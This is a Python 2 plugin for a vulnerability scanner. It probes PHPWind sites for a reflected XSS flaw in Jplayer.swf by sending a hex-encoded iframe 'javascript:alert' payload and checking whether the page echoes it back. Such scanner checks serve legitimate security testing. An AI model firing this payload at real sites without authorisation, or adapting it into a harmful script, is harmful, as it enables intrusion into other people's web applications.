# -*- coding: cp936 -*-
'''
Demo modules for ass_hole_hunter
Reprouct from mst
'''
from libs.functions import *
#import modules.*


class hunter_exploit:
    '''discuz'''
    infos = {
        'plugin_name':'PHPWIND反射型XSS漏洞_Jplayer',
        'author':'demon',
        'update':'2015/10/07',
        'site':'http://www.dawner.info',
        'vuln_type':'xss',
        'vuln_source':'http://www.wooyun.org/bugs/wooyun-2013-038433'
        }
    opts  = {
        'url':'192.168.1.254 or default',
        }


    def __init__(self,url):
        self.url = url

    def exploit(self):
        '''start exploit'''
        exp_url = self.url+"/res/js/dev/util_libs/jPlayer/Jplayer.swf?jQuery=document.write&id=\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3A\x61\x6C\x65\x72\x74\x28\x32\x33\x33\x33\x29\x3E"
        try:
            resp = url_get(exp_url).read()
        except Exception,e:
            print e
        try:
            if '233' in resp or 'x3C' in resp:
                print '[!]PHPWIND exsit xss at Jplayer.swf.\n'
                print '[+]Vul_url:'+exp_url+'\n'
                exp_url =  str(exp_url)
                return exp_url
        except Exception,e:
            print e
